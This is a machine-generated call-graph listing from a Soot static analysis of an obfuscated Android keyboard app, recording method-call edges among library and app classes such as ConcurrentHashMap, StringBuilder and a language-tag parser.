STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <liy: int size()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(0) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqr: lsa l()> ==> <lkq: lsb B()>
CLINIT edge: staticinvoke <iej: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iej: void <clinit>()>
INTERFACE edge: $z1 = interfaceinvoke $r0.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lqq: void <init>(java.lang.Object,java.lang.Object[],int)> ==> <lkx: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>($r7, $r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lsj: void <init>(java.lang.Class)>(class "Ljava/lang/Object;") in <lsl: void <clinit>()> ==> <lsj: void <init>(java.lang.Class)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r9 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>($r1) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>(0, 0) in <lnd: void <init>(java.lang.Object[])> ==> <lsb: void <init>(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r1) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke $r0.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<lsz: boolean equals(java.lang.Object)>($r6) in <lsn: boolean ac()> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<ldp: java.lang.Object a(java.lang.Object)>($r4) in <hcb: java.lang.Object l(java.lang.String,ldp)> ==> <hbw: java.lang.Object a(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void a(long,int)>(1L, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void a(long,int)>
VIRTUAL edge: r0 = virtualinvoke r0.<lqd: lqd d(ldp)>($r1) in <lqd: lqd c()> ==> <lqd: lqd d(ldp)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>("%s:%s", $r2) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i1, $i0) in <lsb: void <init>(int,int)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
INTERFACE edge: interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r1, $r5) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsq: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r0) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lak: void <init>(byte[])> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <izw: lsa w(java.lang.Object)>($r2) in <lrg: lsa l()> ==> <izw: lsa w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
STATIC edge: $r0 = staticinvoke <java.util.Collections: java.util.List emptyList()>() in <lvt: void <clinit>()> ==> <java.util.Collections: java.util.List emptyList()>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
STATIC edge: staticinvoke <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>($r2, $r1, $z0) in <lsh: lse h(java.util.logging.Level)> ==> <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>
CLINIT edge: staticinvoke <lqs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqs: void <clinit>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, null) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
SPECIAL edge: specialinvoke $r4.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke r0.<ljd: int e()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int e()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 2) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $r29 = staticinvoke <android.util.Base64: byte[] decode(java.lang.String,int)>($r12, 3) in <hbw: java.lang.Object a(java.lang.Object)> ==> <android.util.Base64: byte[] decode(java.lang.String,int)>
STATIC edge: $r2 = staticinvoke <lum: lto d(java.lang.String)>($r0) in <lsh: lsh j(java.lang.String)> ==> <lum: lto d(java.lang.String)>
STATIC edge: $r9 = staticinvoke <java.security.SecureRandom: byte[] getSeed(int)>(8) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.SecureRandom: byte[] getSeed(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljd: void q(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int b()> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r0.<ljd: void <init>()>() in <ljd: ljd g()> ==> <ljd: void <init>()>
STATIC edge: $z0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r5, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
STATIC edge: $r2 = staticinvoke <hnc: java.lang.String k(java.lang.String,java.lang.String)>($r2, $r3) in <hnc: java.lang.String d(hmm)> ==> <hnc: java.lang.String k(java.lang.String,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean isEmpty()>() in <ljd: int c()> ==> <ljd: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r1 = virtualinvoke $r7.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r0.<java.util.Map: java.lang.Object get(java.lang.Object)>($r2) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>($r2) in <miv: void <clinit>()> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
CLINIT edge: staticinvoke <lqr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqr: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: java.lang.Object[] n()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljb: void a()> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <lje: void a()> ==> <java.util.ConcurrentModificationException: void <init>()>
VIRTUAL edge: $r12 = virtualinvoke $r2.<ivv: ivw a()>() in <ivw: ivw d(java.util.Locale)> ==> <ivv: ivw a()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <liz: void <init>(ljd)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <ivw: ivw g(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivw: ivw g(java.lang.String)>
SPECIAL edge: specialinvoke $r10.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_CATEGORY_METADATA", 10, 10) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean O(char)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lli: java.util.Collection b()>() in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lmb: java.util.Collection b()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r4.<hbv: boolean m(java.lang.Object)>($r1) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: boolean m(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r3.<java.lang.String: int indexOf(int)>(95) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: int indexOf(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("must be power of 2 between 2^1 and 2^30: ") in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int size()>() in <ljf: boolean isEmpty()> ==> <ljf: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: java.util.Iterator iterator()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Object: java.lang.Object clone()>() in <lkg: void g(int)> ==> <java.lang.Object: java.lang.Object clone()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Set: int size()>() in <ljf: int size()> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r0.<ivv: void <init>(byte[])>(null) in <ivw: ivv I()> ==> <ivv: void <init>(byte[])>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag") in <ivw: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lin: void <init>(ldp,lqd)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lvs: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lsm: int a(lsz)>($r1) in <lsm: java.lang.Object d(lsz)> ==> <lsm: int a(lsz)>
SPECIAL edge: specialinvoke $r5.<java.text.SimpleDateFormat: void <init>(java.lang.String)>("yyyy-MM-dd\'T\'HH:mm:ss.SSSZ") in <lsc: void f(java.lang.String,ltn)> ==> <java.text.SimpleDateFormat: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(19) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r11.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r4.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
SPECIAL edge: specialinvoke $r1.<com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqo: void <init>(lkx,lkq)> ==> <lma: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": logging error [") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $i0 = staticinvoke <izw: int ac(int)>($i0) in <izw: int ad(java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.lang.Object e(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: java.lang.Object e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <ivw: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String substring(int)>(1) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.String substring(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <qj: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: $r0 = staticinvoke <lmo: lqs G(java.util.Comparator)>($r1) in <lme: lma l(java.util.Comparator)> ==> <lmo: lqs G(java.util.Comparator)>
VIRTUAL edge: virtualinvoke $r3.<lmb: void g(java.lang.Object,java.lang.Object)>($r5, $r11) in <hbv: void j()> ==> <lmb: void g(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $r3 = staticinvoke <lri: java.util.ArrayList P(java.util.Iterator)>($r2) in <izw: java.util.Collection at(java.lang.Iterable)> ==> <lri: java.util.ArrayList P(java.util.Iterator)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljd: void q(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Enum: int hashCode()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lji: void <init>(java.util.Comparator)> ==> <lqd: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <llg: void <init>(llo)> ==> <lsa: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r0, $r1) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: $r3 = staticinvoke <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>($r4, $r5, $r2) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>($r2, $i5, $i1, null) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Duplicated extension singleton: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsp: java.lang.String b()> ==> <java.lang.String: java.lang.String replace(char,char)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r1, $r5) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lrg: void <init>(java.lang.Object)>($r0) in <lma: lma r(java.lang.Object)> ==> <lrg: void <init>(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>($r2, $l1, $r0) in <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>
SPECIAL edge: specialinvoke $r9.<lta: void <init>(lsr,java.lang.Object)>($r3, $r7) in <lsn: boolean ac()> ==> <lta: void <init>(lsr,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean k(char)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(4) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/future/FluentFuture") in <her: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete extension subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i4 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: int length()>
